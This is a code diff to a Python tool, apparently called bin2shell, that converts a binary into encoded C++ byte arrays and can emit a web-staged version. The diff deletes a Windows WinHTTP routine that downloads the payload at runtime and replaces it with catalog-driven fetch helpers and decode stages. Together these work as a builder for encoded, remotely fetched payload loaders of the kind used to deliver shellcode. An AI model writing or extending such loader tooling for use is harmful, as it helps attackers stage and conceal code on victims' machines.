@@ -23,179 +23,18 @@ DEFAULT_YAML_REL = os.path.join("data", "yaml", "algos.yaml")
 PLACEHOLDER_TOKEN = "__PAYLOAD_PLACEHOLDER__"
 
 
-def _web_fetch_helper_block() -> str:
-    return textwrap.dedent("""\n#ifndef BIN2SHELL_WEB_FETCH_HELPERS
-#define BIN2SHELL_WEB_FETCH_HELPERS
-#ifndef _WIN32
-#error "bin2shell web helpers currently support Windows only"
-#endif
-#include <stdexcept>
-#include <string>
-#include <vector>
-#include <windows.h>
-#include <winhttp.h>
-
-// Link with winhttp.lib (and ws2_32.lib if required).
-
-class Bin2ShellHttpHandle {
-public:
-    explicit Bin2ShellHttpHandle(HINTERNET h = nullptr) : handle_(h) {}
-    ~Bin2ShellHttpHandle() {
-        if (handle_) {
-            WinHttpCloseHandle(handle_);
-        }
-    }
-    Bin2ShellHttpHandle(const Bin2ShellHttpHandle&) = delete;
-    Bin2ShellHttpHandle& operator=(const Bin2ShellHttpHandle&) = delete;
-    Bin2ShellHttpHandle(Bin2ShellHttpHandle&& other) noexcept : handle_(other.handle_) {
-        other.handle_ = nullptr;
-    }
-    Bin2ShellHttpHandle& operator=(Bin2ShellHttpHandle&& other) noexcept {
-        if (this != &other) {
-            reset(other.release());
-        }
-        return *this;
-    }
-    HINTERNET get() const { return handle_; }
-    void reset(HINTERNET h = nullptr) {
-        if (handle_ != h) {
-            if (handle_) {
-                WinHttpCloseHandle(handle_);
-            }
-            handle_ = h;
-        }
-    }
-    HINTERNET release() {
-        HINTERNET tmp = handle_;
-        handle_ = nullptr;
-        return tmp;
-    }
-private:
-    HINTERNET handle_;
-};
-
-static std::wstring bin2shell_utf8_to_wide(const std::string& s) {
-    if (s.empty()) {
-        return std::wstring();
-    }
-    int needed = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
-    if (needed <= 0) {
-        throw std::runtime_error("MultiByteToWideChar failed");
-    }
-    std::wstring out(static_cast<size_t>(needed - 1), L'\0');
-    if (MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, out.data(), needed) == 0) {
-        throw std::runtime_error("MultiByteToWideChar failed");
-    }
-    return out;
-}
-
-static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
-    std::wstring wide_url = bin2shell_utf8_to_wide(url);
-    if (wide_url.empty()) {
-        throw std::runtime_error("URL is empty");
-    }
-
-    URL_COMPONENTSW parts{};
-    parts.dwStructSize = sizeof(parts);
-    parts.dwHostNameLength = static_cast<DWORD>(-1);
-    parts.dwUrlPathLength = static_cast<DWORD>(-1);
-
-    if (!WinHttpCrackUrl(wide_url.c_str(), 0, 0, &parts)) {
-        throw std::runtime_error("WinHttpCrackUrl failed");
-    }
-
-    std::wstring host(parts.lpszHostName, parts.dwHostNameLength);
-    std::wstring path(parts.lpszUrlPath, parts.dwUrlPathLength);
-    if (path.empty()) {
-        path = L"/";
-    }
-    INTERNET_PORT port = parts.nPort;
-    DWORD flags = (parts.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
-
-    Bin2ShellHttpHandle session(WinHttpOpen(L"bin2shell/1",
-                                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                            WINHTTP_NO_PROXY_NAME,
-                                            WINHTTP_NO_PROXY_BYPASS,
-                                            0));
-    if (!session.get()) {
-        throw std::runtime_error("WinHttpOpen failed");
-    }
-
-    Bin2ShellHttpHandle connection(WinHttpConnect(session.get(), host.c_str(), port, 0));
-    if (!connection.get()) {
-        throw std::runtime_error("WinHttpConnect failed");
-    }
-
-    Bin2ShellHttpHandle request(WinHttpOpenRequest(connection.get(),
-                                                   L"GET",
-                                                   path.c_str(),
-                                                   nullptr,
-                                                   WINHTTP_NO_REFERER,
-                                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                                   flags));
-    if (!request.get()) {
-        throw std::runtime_error("WinHttpOpenRequest failed");
-    }
-
-    static const wchar_t* kHeaders = L"Connection: close\r\n";
-    if (!WinHttpSendRequest(request.get(),
-                            kHeaders,
-                            -1L,
-                            WINHTTP_NO_REQUEST_DATA,
-                            0,
-                            0,
-                            0)) {
-        throw std::runtime_error("WinHttpSendRequest failed");
-    }
-
-    if (!WinHttpReceiveResponse(request.get(), nullptr)) {
-        throw std::runtime_error("WinHttpReceiveResponse failed");
-    }
-
-    DWORD status_code = 0;
-    DWORD status_size = sizeof(status_code);
-    if (!WinHttpQueryHeaders(request.get(),
-                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                             WINHTTP_HEADER_NAME_BY_INDEX,
-                             &status_code,
-                             &status_size,
-                             WINHTTP_NO_HEADER_INDEX)) {
-        throw std::runtime_error("WinHttpQueryHeaders failed");
-    }
-    if (status_code >= 400 || status_code == 0) {
-        throw std::runtime_error("HTTP error: " + std::to_string(status_code));
-    }
-
-    std::vector<unsigned char> body;
-    for (;;) {
-        DWORD available = 0;
-        if (!WinHttpQueryDataAvailable(request.get(), &available)) {
-            throw std::runtime_error("WinHttpQueryDataAvailable failed");
-        }
-        if (available == 0) {
-            break;
-        }
-        size_t offset = body.size();
-        body.resize(offset + available);
-        DWORD read = 0;
-        if (!WinHttpReadData(request.get(), body.data() + offset, available, &read)) {
-            throw std::runtime_error("WinHttpReadData failed");
-        }
-        body.resize(offset + read);
-        if (read == 0) {
-            break;
-        }
-    }
-
-    return body;
-}
-
-static std::string bin2shell_fetch_payload_text(const std::string& url) {
-    auto bytes = bin2shell_fetch_payload_from_url(url);
-    return std::string(bytes.begin(), bytes.end());
-}
-#endif // BIN2SHELL_WEB_FETCH_HELPERS
-""")
+def _web_fetch_helper_block(catalog: "Catalog", web_helper_idx: int) -> str:
+    spec = catalog.web_helpers.get(web_helper_idx)
+    if not spec:
+        raise CLIError(f"Web helper index {web_helper_idx} not found in catalog")
+    name = spec.get("name", "unknown")
+    parts = [
+        f"// --- web helper: {name} ---\n",
+        spec["cpp_includes"].rstrip() + "\n\n",
+        spec["cpp_fetch_bytes"].rstrip() + "\n\n",
+        spec["cpp_fetch_text"].rstrip() + "\n",
+    ]
+    return "\n".join(parts)
 
 def _normalize_newlines(value: str) -> str:
     return value.replace("\r\n", "\n").replace("\r", "\n")
@@ -232,6 +71,7 @@ class CLIArgs:
     encoder_index: Optional[int]
     envelope_index: Optional[int]
     web_mode: bool
+    web_helper_index: Optional[int] = None
     output_path: Optional[str] = None
 
 
@@ -241,6 +81,8 @@ class GenerationContext:
     payload_bytes: Optional[bytes]
     payload_text: Optional[str]
     options_meta: Dict[str, Any]
+    catalog: Optional["Catalog"] = None
+    web_helper_index: int = 0
 
 
 def _make_web_payload_array(name: str, expected_len: int) -> str:
@@ -276,13 +118,12 @@ def _make_web_len_block(name: str, value: int, payload_name: str, literal: bool)
     return (
         f"static const unsigned int {expected_name} = {value};\n"
         f"{var_line}"
-        f"static const bool {compare_target}_check = []() {{\n"
+        f"[[maybe_unused]] static const bool {compare_target}_check = []() {{\n"
         f"    if ({compare_target} != {expected_name}) {{\n"
         f"        throw std::runtime_error(\"Fetched payload length mismatch for {payload_name}\");\n"
         f"    }}\n"
         f"    return true;\n"
         f"}}();\n"
-        f"(void){compare_target}_check;\n"
     )
 
 
@@ -317,6 +158,8 @@ def _render_sections(
     web_mode: bool,
     term_width: int,
     placeholder: str,
+    catalog: Optional["Catalog"] = None,
+    web_helper_idx: int = 0,
 ) -> str:
     chunks: List[str] = []
     web_payload_arrays: Set[str] = set()
@@ -336,7 +179,10 @@ def _render_sections(
                 raw_open = False
             if web_mode:
                 if not helpers_injected:
-                    chunks.append(_web_fetch_helper_block())
+                    if catalog and catalog.web_helpers:
+                        chunks.append(_web_fetch_helper_block(catalog, web_helper_idx))
+                    else:
+                        raise CLIError("Web mode requires web_helpers in YAML catalog")
                     helpers_injected = True
                 name = meta["name"]
                 expected_len = len(meta.get("data", b""))
@@ -355,7 +201,10 @@ def _render_sections(
                 raw_open = False
             if web_mode:
                 if not helpers_injected:
-                    chunks.append(_web_fetch_helper_block())
+                    if catalog and catalog.web_helpers:
+                        chunks.append(_web_fetch_helper_block(catalog, web_helper_idx))
+                    else:
+                        raise CLIError("Web mode requires web_helpers in YAML catalog")
                     helpers_injected = True
                 name = meta["name"]
                 expected_len = len(meta.get("text", ""))
@@ -430,6 +279,14 @@ def _catalog_epilog(yaml_path: str) -> str:
                 name = spec.get("name", "")
                 desc = spec.get("desc", "")
                 lines.append(f"  [{idx}] {name}" + (f"  {desc}" if desc else ""))
+            if cat.web_helpers:
+                lines.append("")
+                lines.append("available web helpers:")
+                for spec in cat.list_block("web_helpers"):
+                    idx = spec.get("index", "?")
+                    name = spec.get("name", "")
+                    desc = spec.get("desc", "")
+                    lines.append(f"  [{idx}] {name}" + (f"  {desc}" if desc else ""))
             lines.append("")
             lines.append(f"defaults: encoder={cat.default_index('encoders')}, envelope={cat.default_index('envelopes')}")
     except Exception:
@@ -454,6 +311,8 @@ def _build_parser(yaml_path: str) -> argparse.ArgumentParser:
                         help=f"path to algorithms YAML (default: {DEFAULT_YAML_REL})")
     parser.add_argument("-w", "--web", action="store_true",
                         help="emit YAML bundle with web-fetch C++ template")
+    parser.add_argument("-wh", "--web-helper", type=int, default=None, metavar="N",
+                        help="web helper index for HTTP fetch implementation (see list below)")
     parser.add_argument("-o", "--output", default=None, metavar="FILE",
                         help="write output to FILE instead of stdout")
     return parser
@@ -474,6 +333,7 @@ def _parse_args(argv: List[str]) -> CLIArgs:
         encoder_index=ns.encoder,
         envelope_index=ns.envelope,
         web_mode=ns.web,
+        web_helper_index=ns.web_helper,
         output_path=ns.output,
     )
 
@@ -590,7 +450,7 @@ def _build_catalog_context(
 
     sections.append(Section("raw", {"text": "\n// code_blob now holds the original binary bytes; length = code_blob_len\n"}))
 
-    options_meta = {
+    options_meta: Dict[str, Any] = {
         "encoder": {"index": enc_spec.get("index"), "name": enc_spec.get("name")},
         "envelope": {"index": env_spec.get("index"), "name": env_spec.get("name")},
         "yaml_path": yaml_path,
@@ -608,43 +468,123 @@ def _format_payload_bytes(payload: bytes, group: int = 16) -> str:
 def _emit_web(context: GenerationContext, term_width: int) -> None:
     if context.payload_bytes is None:
         raise CLIError("Error: payload unavailable for web output")
+    catalog = context.catalog
+    if not catalog or not catalog.web_helpers:
+        raise CLIError("Web mode requires web_helpers in YAML catalog")
 
-    code_template = _render_sections(context.sections, True, term_width, PLACEHOLDER_TOKEN)
+    wh_spec = catalog.web_helpers.get(context.web_helper_index)
+    if not wh_spec:
+        raise CLIError(f"Web helper index {context.web_helper_index} not found")
+
+    # --- cpp_includes ---
+    cpp_includes = wh_spec["cpp_includes"].rstrip() + "\n"
+
+    # --- cpp_declarations: keys + length vars (before payload/raw sections) ---
+    decl_chunks: List[str] = []
+    for sec in context.sections:
+        if sec.kind in ("payload_array", "payload_string", "raw"):
+            break
+        m = sec.meta
+        if sec.kind == "array":
+            decl_chunks.append(make_c_array(m["name"], m["data"], term_width))
+        elif sec.kind == "len_var":
+            decl_chunks.append(make_len_var(m["name"], m["value"]))
+        elif sec.kind == "len_literal":
+            decl_chunks.append(f"unsigned int {m['name']} = {m['value']};\n")
+    cpp_declarations = "".join(decl_chunks).rstrip() + "\n" if decl_chunks else ""
+
+    # --- cpp_web_fetch ---
+    cpp_web_fetch = (
+        wh_spec["cpp_fetch_bytes"].rstrip() + "\n\n" +
+        wh_spec["cpp_fetch_text"].rstrip() + "\n"
+    )
+
+    # --- cpp_payload_init: URL fetch + length check ---
+    init_chunks: List[str] = []
+    payload_seen = False
+    for sec in context.sections:
+        m = sec.meta
+        if sec.kind in ("payload_array", "payload_string"):
+            payload_seen = True
+            name = m["name"]
+            if sec.kind == "payload_array":
+                expected_len = len(m.get("data", b""))
+                init_chunks.append(_make_web_payload_array(name, expected_len))
+            else:
+                expected_len = len(m.get("text", ""))
+                init_chunks.append(_make_web_payload_string(name, expected_len))
+        elif payload_seen and sec.kind in ("len_var", "len_literal") and sec.kind != "raw":
+            name = m["name"]
+            value = m["value"]
+            payload_name = m.get("payload_name", name)
+            if sec.kind == "len_literal":
+                init_chunks.append(_make_web_len_block(name, value, payload_name, literal=True))
+            else:
+                init_chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
+        elif sec.kind == "raw":
+            break
+    cpp_payload_init = "".join(init_chunks).rstrip() + "\n" if init_chunks else ""
+
+    # --- cpp_decode: envelope decode + encoder inverse (raw sections) ---
+    # Wrapped in a lambda that produces code_blob / code_blob_len at file scope.
+    decode_chunks: List[str] = []
+    for sec in context.sections:
+        if sec.kind == "raw":
+            decode_chunks.append(sec.meta.get("text", ""))
+    if decode_chunks:
+        raw_body = "".join(decode_chunks)
+        indented = _indent_block(raw_body, "    ")
+        cpp_decode = (
+            "struct Bin2ShellPayload {\n"
+            "    unsigned char* code_blob;\n"
+            "    unsigned int code_blob_len;\n"
+            "};\n\n"
+            "static Bin2ShellPayload bin2shell_payload = []() {\n"
+            + indented +
+            "\n    return Bin2ShellPayload{code_blob, code_blob_len};\n"
+            "}();\n\n"
+            "unsigned char* code_blob = bin2shell_payload.code_blob;\n"
+            "unsigned int code_blob_len = bin2shell_payload.code_blob_len;\n"
+        )
+    else:
+        cpp_decode = ""
+
+    # --- payload + options ---
     payload_value = context.payload_text if context.payload_text is not None else _format_payload_bytes(context.payload_bytes)
     checksum_value = hashlib.sha256(context.payload_bytes).hexdigest()
 
-    payload_checksum = {
-        "algorithm": "sha256",
-        "value": checksum_value,
-    }
-    options = {**context.options_meta, "web": True}
+    wh_info = {"index": wh_spec.get("index"), "name": wh_spec.get("name")}
+    options = {**context.options_meta, "web": True, "web_helper": wh_info}
+    options["payload_len"] = len(context.payload_bytes)
+    options["payload_checksum"] = {"algorithm": "sha256", "value": checksum_value}
 
-    payload_checksum_yaml = yaml.safe_dump(
-        {"payload_checksum": payload_checksum},
-        sort_keys=False,
-        default_flow_style=False,
-    ).rstrip()
     options_yaml = yaml.safe_dump(
-        {"options": options},
-        sort_keys=False,
-        default_flow_style=False,
+        {"options": options}, sort_keys=False, default_flow_style=False,
     ).rstrip()
 
-    output = "\n".join(
-        [
-            _block_scalar("code_template", code_template),
-            _block_scalar("payload", payload_value),
-            payload_checksum_yaml,
-            options_yaml,
-        ]
-    )
+    parts = [
+        _block_scalar("cpp_includes", cpp_includes),
+    ]
+    if cpp_declarations:
+        parts.append(_block_scalar("cpp_declarations", cpp_declarations))
+    parts.extend([
+        _block_scalar("cpp_web_fetch", cpp_web_fetch),
+        _block_scalar("cpp_payload_init", cpp_payload_init),
+    ])
+    if cpp_decode:
+        parts.append(_block_scalar("cpp_decode", cpp_decode))
+    parts.extend([
+        _block_scalar("payload", payload_value),
+        options_yaml,
+    ])
 
-    sys.stdout.write(output + "\n")
+    sys.stdout.write("\n".join(parts) + "\n")
 
 
 def _emit_native(context: GenerationContext, term_width: int) -> None:
     code_output = _normalize_newlines(
-        _render_sections(context.sections, False, term_width, PLACEHOLDER_TOKEN)
+        _render_sections(context.sections, False, term_width, PLACEHOLDER_TOKEN,
+                         catalog=context.catalog, web_helper_idx=context.web_helper_index)
     )
     sys.stdout.write(code_output)
 
@@ -655,7 +595,13 @@ def main(argv: List[str]) -> int:
         data = _load_binary(args.input_path)
         term_width = max(40, get_terminal_width())
 
-        if args.yaml_override is None and args.encoder_index is None and args.envelope_index is None:
+        needs_catalog = (
+            args.yaml_override is not None
+            or args.encoder_index is not None
+            or args.envelope_index is not None
+            or args.web_mode
+        )
+        if not needs_catalog:
             context = _build_simple_context(data)
         else:
             yaml_path = _resolve_yaml_path(args.yaml_override)
@@ -664,7 +610,13 @@ def main(argv: List[str]) -> int:
                     f"Error: YAML not found. Expected at '{yaml_path}'. Pass with -y if different."
                 )
             catalog = _load_catalog(yaml_path)
-            context = _build_catalog_context(args, data, catalog, yaml_path)
+            web_helper_idx = args.web_helper_index if args.web_helper_index is not None else catalog.default_index("web_helpers") if catalog.web_helpers else 0
+            if args.encoder_index is None and args.envelope_index is None and not args.web_mode:
+                context = _build_simple_context(data)
+            else:
+                context = _build_catalog_context(args, data, catalog, yaml_path)
+            context.catalog = catalog
+            context.web_helper_index = web_helper_idx
 
         out_fd = None
         if args.output_path:
